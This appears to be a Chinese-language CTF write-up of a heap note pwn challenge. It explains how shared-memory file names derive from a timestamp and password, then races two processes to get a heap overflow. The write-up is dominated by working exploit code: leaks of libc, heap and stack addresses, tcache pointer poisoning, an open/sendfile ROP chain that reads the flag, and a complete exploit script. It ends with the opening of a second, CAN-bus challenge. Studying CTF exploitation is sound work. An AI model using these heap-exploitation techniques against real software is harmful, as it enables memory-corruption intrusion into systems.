
```python
def add(size):
io.sendlineafter(b'$> ', b'add')
io.sendlineafter(b'Enter size of note: ', str(size).encode())
def edit(index, size ,content=b'\x01'):
io.sendlineafter(b'$> ', b'edit')
io.sendlineafter(b'Enter index of note to edit: ', str(index).encode())
io.sendlineafter(b'Enter newsize: ', str(size).encode())
if content==b'\x01':
io.sendlineafter(b'Do you confirm to editing this note? (y/n): ',b'n')
else:
io.sendlineafter(b'Do you confirm to editing this note? (y/n): ',b'y')
io.sendlineafter(b'Enter new content for note: ', content)
def free(index):
io.sendlineafter(b'$> ', b'del')
io.sendlineafter(b'Enter index of note to delete: ', str(index).encode())
def show(index):
io.sendlineafter(b'$> ', b'show')
io.sendlineafter(b'Enter index of note to show: ', str(index).encode())
```

很标准的增删改查

### 漏洞寻找

### 堆管理系统

最先堆操作原语中寻找漏洞,比如常见的`uaf`，堆溢出（包括`offbynull`，`offbyone`）

按照特征对几个漏洞进行分析,使用了`gdb`调试与`fuzzer`进行盲打

发现并不存在漏洞,也就是说堆管理系统是安全的

### 共享内存

这道题的特色就是存在着一个管理堆块大小的`磁盘-内存共享空间`

既然堆管理原语不存在漏洞,那么漏洞只能存在于这个共享内存中了

通过`gdb`调试发现,每次创建的文件名都是一串随机字符

![图片描述](upload/attach/202510/1024538_DGFR5XT83RKZJN3.webp)

通过对字符串进行溯源,可以猜测字符串的生产与可能输入的`passwd`和时间有关

![图片描述](upload/attach/202510/1024538_4UF6VSNJHFMZU9B.webp)

此时使用`hook`对猜想进行验证

```c
#define \_GNU\_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <unistd.h>
void open(char\* filename)
{
puts("\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*");
printf("%s",filename);
return;
}
```

将此源码编译为`.so`并在程序运行时`PRELOAD`,open操作会被hook为打印操作

可以显示出我们的字符串

再写一个简单的py脚本对每次运行时回显的文件名进行接收

```python
from pwn import \*
lib = os.path.abspath('./hook.so')
env = os.environ.copy()
env['LD\_PRELOAD'] = lib
#io = process(['./pwn'], env=env)
def bug():
gdb.attach(io,"b \*$rebase(0x3ABD)\nc")
while True:
io = process(['./pwn'], env=env)
io.recvuntil(b'select: ')
io.sendline(b'1')
io.recvuntil(b'characters): ')
io.sendline(b'Mim')
io.recvuntil(b'select: ')
io.sendline(b'2')
io.recvuntil(b"\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\n")
filename=io.recvuntil(b"Failed")[:-6].decode()
os.system(f"echo {filename} >> log.txt")
io.close()
```

结果会被记录在`log.txt`中

运行py后查看log,可以看到文件名随着时间均匀变化,证明文件名确实是时间戳产生的随机数与`passwd`组合产生的摘要

![图片描述](upload/attach/202510/1024538_4VYAM68MWYUNQF8.webp)

### 条件竞争

现在我们已知

1. 每个`elf`的进程都会打开一个文件,并时时刻刻共享此进程中的内存与磁盘

2. 短时间内会打开相同的文件,导致一个文件被多个进程的内存共享

3. 堆操作原语中不存在可以利用的漏洞(除`heap`与`libc`的信息泄露)

只要让两个进程同时打开一个文件,一个文件对堆块大小列表进行修改,就会映射到另一个进程的堆块大小列表中

这样可以造成任意长度的堆溢出

### 攻击

### 信息泄露

```python
io.recvuntil(b'select: ')
io.sendline(b'1')
io.recvuntil(b'characters): ')
io.sendline(b'Mim')
io.recvuntil(b'select: ')
io.sendline(b'2')
add(0x500)#0
add(0x500)#1
add(0x600)#2
add(0x500)#3
bug()
free(0)
free(2)
add(0x500)
show(0)
io.recvuntil(b'Content: ')
base=u64(io.recv(6)+b'\x00\x00')-0x21ace0
print(hex(base))
free(0)
add(0x500)#0
add(0x600)#2
edit(2,0x10,b'a'\*0x10)
show(2)
io.recvuntil(b'a'\*0x10)
heap=u64(io.recv(6)+b'\x00\x00')-0xd30
print(hex(heap))
free(0)
free(1)
free(2)
free(3)
```

本身操作原语中存在未置零的缺陷,可以直接泄露出`libc`地址与`heap`地址

### 溢出前的堆风水

```python
add(0x10)#0
add(0x60)#1
add(0x80)#2
add(0xa0)#3
add(0x800)#4
add(0x60)#5
add(0xa0)#6
free(5)
free(6)
key=heap>>12
\_IO\_list\_all=base+libc.sym.\_IO\_list\_all
environ=base+libc.sym.environ
free(1)
```

准备了两个堆溢出布局

![图片描述](upload/attach/202510/1024538_UK85643BYDBAZ6R.webp)

第一个用来泄露栈地址

第二个用来劫持返回地址进行`ROP`

### 条件竞争

```python
def overflow():
s=process('./pwn')
s.recvuntil(b'select: ')
s.sendline(b'1')
s.recvuntil(b'characters): ')
s.sendline(b'Mim')
s.recvuntil(b'select: ')
s.sendline(b'2')
s.sendlineafter(b'$> ', b'add')
s.sendlineafter(b'Enter size of note: ', str(0x500).encode())
s.sendlineafter(b'$> ', b'add')
s.sendlineafter(b'Enter size of note: ', str(0x500).encode())
s.sendlineafter(b'$> ', b'add')
s.sendlineafter(b'Enter size of note: ', str(0x500).encode())
s.close()
```

随后进行条件竞争,开启另外一个进程中将堆块大小列表填入三个`0x500`

如果进程`s`和进程`io`开启了同一个文件,就会导致`io`中堆块大小被修改为`0x500`

![图片描述](upload/attach/202510/1024538_THNVHVMHFVRFFE3.webp)

经过小小的爆破,可以看到`io`进程中的共享内存被`s`进程的操作修改

此时可以使用`edit`功能进行栈溢出

### next污染与栈溢出

```python
edit(0,0x28,b'a'\*0x10+p64(0)+p64(0x71)+p64(key^environ))
chun=heap+0x4e0
add(0x60)#1
add(0x60)#5
show(5)
io.recvuntil(b"Content: ")
stack=u64(io.recv(6)+b'\x00\x00')-0x228-8-0x88
print(f"stack-->{hex(stack)}")
free(3)
edit(2,0x98,b'a'\*0x80+p64(0)+p64(0xb1)+p64(key^(stack)))
add(0xa0)#3
add(0xa0)#6
flag=stack
rdi=p64(base+0x000000000002a3e5)
rsi=p64(base+0x000000000002be51)
rdx=p64(base+0x000000000011f357)
rcx=p64(base+0x000000000003d1ee)
ope=base+libc.sym.open
sendfile=base+libc.sym.sendfile
orw =rdi+p64(flag)+rsi+p64(0)+rdx+p64(0)\*2+p64(ope)
orw+=rdi+p64(1)+rsi+p64(3)+rdx+p64(0)\*2+rcx+p64(0x100)+p64(sendfile)
edit(6,0xa0,b"./flag\x00\x00"+orw)
io.interactive()
```

通过这道题我发现劫持read函数的返回地址是最方便的,不用担心canary的问题

以前都是劫持edit函数的返回地址,有时候add函数中没用read功能就会导致add返回时canary被修改

### EXP

```python
from pwn import \*
#context.log\_level='debug'
io=process('./pwn')
#s=process('./pwn')
libc=ELF('./libc.so.6')
def bug():
gdb.attach(io)
def add(size):
io.sendlineafter(b'$> ', b'add')
io.sendlineafter(b'Enter size of note: ', str(size).encode())
def edit(index, size ,content=b'\x01'):
io.sendlineafter(b'$> ', b'edit')
io.sendlineafter(b'Enter index of note to edit: ', str(index).encode())
io.sendlineafter(b'Enter newsize: ', str(size).encode())
if content==b'\x01':
io.sendlineafter(b'Do you confirm to editing this note? (y/n): ',b'n')
else:
io.sendlineafter(b'Do you confirm to editing this note? (y/n): ',b'y')
io.sendlineafter(b'Enter new content for note: ', content)
def free(index):
io.sendlineafter(b'$> ', b'del')
io.sendlineafter(b'Enter index of note to delete: ', str(index).encode())
def show(index):
io.sendlineafter(b'$> ', b'show')
io.sendlineafter(b'Enter index of note to show: ', str(index).encode())
def overflow():
s=process('./pwn')
s.recvuntil(b'select: ')
s.sendline(b'1')
s.recvuntil(b'characters): ')
s.sendline(b'Mim')
s.recvuntil(b'select: ')
s.sendline(b'2')
s.sendlineafter(b'$> ', b'add')
s.sendlineafter(b'Enter size of note: ', str(0x500).encode())
s.sendlineafter(b'$> ', b'add')
s.sendlineafter(b'Enter size of note: ', str(0x500).encode())
s.sendlineafter(b'$> ', b'add')
s.sendlineafter(b'Enter size of note: ', str(0x500).encode())
s.close()
io.recvuntil(b'select: ')
io.sendline(b'1')
io.recvuntil(b'characters): ')
io.sendline(b'Mim')
io.recvuntil(b'select: ')
io.sendline(b'2')
add(0x500)#0
add(0x500)#1
add(0x600)#2
add(0x500)#3
free(0)
free(2)
add(0x500)
show(0)
io.recvuntil(b'Content: ')
base=u64(io.recv(6)+b'\x00\x00')-0x21ace0
print(hex(base))
free(0)
add(0x500)#0
add(0x600)#2
edit(2,0x10,b'a'\*0x10)
show(2)
io.recvuntil(b'a'\*0x10)
heap=u64(io.recv(6)+b'\x00\x00')-0xd30
print(hex(heap))
free(0)
free(1)
free(2)
free(3)
#=-=-=-=-=-=-==-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=--=
add(0x10)#0
add(0x60)#1
add(0x80)#2
add(0xa0)#3
add(0x800)#4
add(0x60)#5
add(0xa0)#6
free(5)
free(6)
key=heap>>12
\_IO\_list\_all=base+libc.sym.\_IO\_list\_all
environ=base+libc.sym.environ
free(1)
overflow()
bug()
edit(0,0x28,b'a'\*0x10+p64(0)+p64(0x71)+p64(key^environ))
chun=heap+0x4e0
add(0x60)#1
add(0x60)#5
show(5)
io.recvuntil(b"Content: ")
stack=u64(io.recv(6)+b'\x00\x00')-0x228-8-0x88
print(f"stack-->{hex(stack)}")
free(3)
edit(2,0x98,b'a'\*0x80+p64(0)+p64(0xb1)+p64(key^(stack)))
add(0xa0)#3
add(0xa0)#6
flag=stack
rdi=p64(base+0x000000000002a3e5)
rsi=p64(base+0x000000000002be51)
rdx=p64(base+0x000000000011f357)
rcx=p64(base+0x000000000003d1ee)
ope=base+libc.sym.open
sendfile=base+libc.sym.sendfile
orw =rdi+p64(flag)+rsi+p64(0)+rdx+p64(0)\*2+p64(ope)
orw+=rdi+p64(1)+rsi+p64(3)+rdx+p64(0)\*2+rcx+p64(0x100)+p64(sendfile)
edit(6,0xa0,b"./flag\x00\x00"+orw)
io.interactive()
```

## 车联网 can

![图片描述](upload/attach/202510/1024538_Q727E8MS48WGEVQ.webp)

先是开始沙箱和初始化缓冲区和一些结构体后,要求输入硬编码的魔数

随后是个菜单,显式选项有三个,`退出` `帮助` 和 `重置`

退出和帮助没什么用,重置会再次刷新结构体成员

![图片描述](upload/attach/202510/1024538_MU6M8HSTW92Q5TW.webp)

结构体中包含一枚函数指针,几乎可以猜到要攻击什么东西了
